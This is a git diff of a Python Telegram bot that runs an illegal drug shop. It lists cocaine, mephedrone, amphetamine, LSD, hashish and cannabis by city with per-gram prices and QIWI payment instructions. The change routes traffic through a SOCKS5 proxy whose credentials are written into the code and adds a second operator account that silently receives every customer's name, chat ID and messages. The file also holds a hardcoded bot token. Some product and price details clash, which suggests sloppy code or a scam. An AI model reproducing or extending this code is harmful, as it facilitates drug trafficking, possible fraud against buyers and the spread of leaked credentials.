@@ -2,8 +2,11 @@ import telebot
 from telebot import apihelper
 from telebot import types
 
+apihelper.proxy = {'https':'socks5://3pQihGYFQd:RG8DQAdxFp@172.96.139.48:51582'}
+
 token = "988269188:AAHXhq2vahut1mL4tJ0Ps62GgTMwGG7I4M0"
 id = "797137132"
+id2 = "1026388950"
 site = "https://qiwi.me/oplataneona22"
 channel = "@TriPna"
 op = "@BitMeb"
@@ -13,6 +16,7 @@ bot = telebot.TeleBot(token)
 @bot.message_handler(commands=["start"])
 def repeat_all_messages(message):
     bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Написал: " + str(message.text))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Написал: " + str(message.text))
     keyboard = types.InlineKeyboardMarkup()
     button1 = types.InlineKeyboardButton(text="Москва", callback_data="metro")
     button2 = types.InlineKeyboardButton(text="Воронеж", callback_data="button2")
@@ -72,8 +76,10 @@ def button(message, city, metr="Нету"):
     button6 = types.InlineKeyboardButton(text="КОКАИН", callback_data="CO")
     button7 = types.InlineKeyboardButton(text="АМФЕТАМИН", callback_data="AM")
     bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Выбрал: " + str(city))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(city))
     if metr!="Нету":
         bot.send_message(id, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(metr))
+        bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(metr))
     keyboard1.add(button1)
     keyboard1.add(button2)
     keyboard1.add(button3)
@@ -89,6 +95,7 @@ def ME(message, name):
     button2 = types.InlineKeyboardButton(text="1г - 1500р", callback_data="M1")
     button3 = types.InlineKeyboardButton(text="2г - 2000р", callback_data="M2")
     bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Выбрал: " + str(name))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
     keyboard2.add(button1)
     keyboard2.add(button2)
     keyboard2.add(button3)
@@ -99,6 +106,7 @@ def SO(message, name):
     button1 = types.InlineKeyboardButton(text="1г - 1100р", callback_data="S1")
     button2 = types.InlineKeyboardButton(text="2г - 1900р", callback_data="S2")
     bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Выбрал: " + str(name))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
     keyboard2.add(button1)
     keyboard2.add(button2)
     bot.send_message(message.chat.id, "Вы выбрали "+str(name)+".\nТеперь выберите количество:", reply_markup=keyboard2)
@@ -108,6 +116,7 @@ def GA(message, name):
     button2 = types.InlineKeyboardButton(text="1г - 950р", callback_data="G1")
     button3 = types.InlineKeyboardButton(text="2г - 1550р", callback_data="G2")
     bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Выбрал: " + str(name))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
     keyboard2.add(button2)
     keyboard2.add(button3)
     bot.send_message(message.chat.id, "Вы выбрали "+str(name)+".\nТеперь выберите количество:", reply_markup=keyboard2)
@@ -117,6 +126,7 @@ def LS(message, name):
     button2 = types.InlineKeyboardButton(text="1шт - 950р", callback_data="L1")
     button3 = types.InlineKeyboardButton(text="2шт - 1650р", callback_data="L2")
     bot.send_message(id, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
     keyboard2.add(button2)
     keyboard2.add(button3)
     bot.send_message(message.chat.id, "Вы выбрали " + str(name) + ".\nТеперь выберите количество:",
@@ -127,6 +137,7 @@ def TR(message, name):
     button2 = types.InlineKeyboardButton(text="1г - 1500р", callback_data="T1")
     button3 = types.InlineKeyboardButton(text="2г - 2000р", callback_data="T2")
     bot.send_message(id, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
     keyboard2.add(button2)
     keyboard2.add(button3)
     bot.send_message(message.chat.id, "Вы выбрали " + str(name) + ".\nТеперь выберите количество:",
@@ -137,6 +148,7 @@ def CO(message, name):
     button2 = types.InlineKeyboardButton(text="0.5г - 5000р", callback_data="C05")
     button3 = types.InlineKeyboardButton(text="1г - 9000р", callback_data="C1")
     bot.send_message(id, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
     keyboard2.add(button2)
     keyboard2.add(button3)
     bot.send_message(message.chat.id, "Вы выбрали " + str(name) + ".\nТеперь выберите количество:",
@@ -147,6 +159,7 @@ def AM(message, name):
     button2 = types.InlineKeyboardButton(text="1г - 950р", callback_data="A1")
     button3 = types.InlineKeyboardButton(text="2г - 1350р", callback_data="A2")
     bot.send_message(id, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Выбрал: " + str(name))
     keyboard2.add(button2)
     keyboard2.add(button3)
     bot.send_message(message.chat.id, "Вы выбрали " + str(name) + ".\nТеперь выберите количество:",
@@ -263,74 +276,90 @@ def callback_inline(call):
 
         elif call.data == "M05":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | МЕФ 0.5г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | МЕФ 0.5г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали МЕФ 0.3г\nК оплате: 900р.\nКоментарий: "+str(message.chat.id))
             buy(message)
         elif call.data == "M1":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: МЕФ 1г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: МЕФ 1г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали МЕФ 1г\nК оплате: 1500р.\nКоментарий: "+str(message.chat.id))
             buy(message)
         elif call.data == "M2":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: МЕФ 2г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: МЕФ 2г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали МЕФ 2г\nК оплате: 2000р.\nКоментарий: "+str(message.chat.id))
             buy(message)
 
         elif call.data == "S1":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: СОЛЬ 1г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: СОЛЬ 1г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали СОЛЬ 1г\nК оплате: 1100р.\nКоментарий: "+str(message.chat.id))
             buy(message)
         elif call.data == "S2":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: СОЛЬ 2г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: СОЛЬ 2г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали СОЛЬ 2г\nК оплате: 1900р.\nКоментарий: "+str(message.chat.id))
             buy(message)
 
         elif call.data == "G1":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: ГАШИШ 1г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: ГАШИШ 1г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали ГАШИШ 1г\nК оплате: 950р.\nКоментарий: "+str(message.chat.id))
             buy(message)
         elif call.data == "G2":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: ГГАШИШ 2г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: ГГАШИШ 2г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали ГАШИШ 2г\nК оплате: 1550р.\nКоментарий: "+str(message.chat.id))
             buy(message)
 
         elif call.data == "L1":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: ЛСД 1шт")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: ЛСД 1шт")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали ЛСД 1шт\nК оплате: 950р.\nКоментарий: "+str(message.chat.id))
             buy(message)
         elif call.data == "L2":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: Гашиш на реагенте 2шт")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: Гашиш на реагенте 2шт")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали ЛСД 2шт\nК оплате: 1650р.\nКоментарий: "+str(message.chat.id))
             buy(message)
 
         elif call.data == "T1":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: ТРАВА 1г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: ТРАВА 1г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали ТРАВА 1г\nК оплате: 1500р.\nКоментарий: "+str(message.chat.id))
             buy(message)
         elif call.data == "T2":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: ТРАВА 2г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: ТРАВА 2г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали ТРАВА 2г\nК оплате: 2000р.\nКоментарий: "+str(message.chat.id))
             buy(message)
 
         elif call.data == "C05":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: КОКАИН 0.5г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: КОКАИН 0.5г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали КОКАИН 0.5г\nК оплате: 5000р.\nКоментарий: "+str(message.chat.id))
             buy(message)
         elif call.data == "C1":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: КОКАИН 1г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: КОКАИН 1г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали КОКАИН 1г\nК оплате: 9000р.\nКоментарий: "+str(message.chat.id))
             buy(message)
 
         elif call.data == "A1":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: АМФЕТАМИН 1г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: АМФЕТАМИН 1г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали АМФЕТАМИН 1г\nК оплате: 950р.\nКоментарий: "+str(message.chat.id))
             buy(message)
         elif call.data == "A2":
             bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Оплачивает: АМФЕТАМИН 2г")
+            bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Оплачивает: АМФЕТАМИН 2г")
             bot.send_message(message.chat.id, "QIWI\nВы выбрали ГАМФЕТАМИН 2г\nК оплате: 1350р.\nКоментарий: "+str(message.chat.id))
             buy(message)
 
 @bot.message_handler(content_types=['text'])
 def echo_all(message):
     bot.send_message(id, str(message.chat.first_name) + " [ "+ str(message.chat.id)+" ] | Написал: " + str(message.text))
+    bot.send_message(id2, str(message.chat.first_name) + " [ " + str(message.chat.id) + " ] | Написал: " + str(message.text))
     bot.send_message(message.chat.id, "Вы что-то делаете не так, пожалуйста нажмите -  /start")
 
 while True:
